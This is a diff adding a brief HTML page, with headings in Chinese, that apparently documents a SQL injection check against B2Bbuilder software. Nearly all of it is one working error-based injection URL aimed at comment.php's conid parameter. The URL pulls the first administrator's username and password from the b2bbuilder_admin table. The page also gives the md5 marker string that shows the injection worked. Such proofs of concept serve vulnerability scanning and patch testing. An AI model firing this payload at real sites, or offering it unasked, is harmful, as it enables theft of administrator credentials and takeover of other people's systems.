@@ -1,0 +1,7 @@
+<meta charset="UTF-8">
+<div>
+    <h3>SQL注入URL: </h3>
+    <code>http://example.com/comment.php?ctype=2&conid=16873%20and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(md5(c),0x3A,password)%20from%20b2bbuilder_admin%20Order%20by%20user%20limit%200,1)%20)%20from%20`information_schema`.tables%20limit%200,1),floor(rand(0)*2))x%20from%20`information_schema`.tables%20group%20by%20x)a)%20and%201=1</code>
+    <h3>返回结果</h3>
+    <p>查看返回页面源码中是否有字符：4a8a08f09d37b73795649038408b5f33</p>
+</div>
